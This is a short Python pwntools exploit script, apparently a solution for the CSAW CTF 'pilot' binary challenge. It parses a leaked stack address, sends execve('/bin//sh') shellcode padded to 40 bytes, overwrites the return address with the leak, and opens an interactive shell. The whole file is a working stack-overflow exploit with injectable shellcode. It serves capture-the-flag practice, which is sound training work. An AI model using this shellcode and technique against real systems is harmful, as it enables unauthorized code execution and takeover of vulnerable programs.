from pwn import *

#p = remote("pwn.chal.csaw.io", 8464)
p = process("./pilot")

print p.recvuntil("[*]Location:0x")
leak = int(p.recvline()[:-1], 16)
log.info("leak : " + hex(leak))

payload = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
payload += "a" * (40-len(payload))
payload += p64(leak)
p.send(payload)
p.interactive()
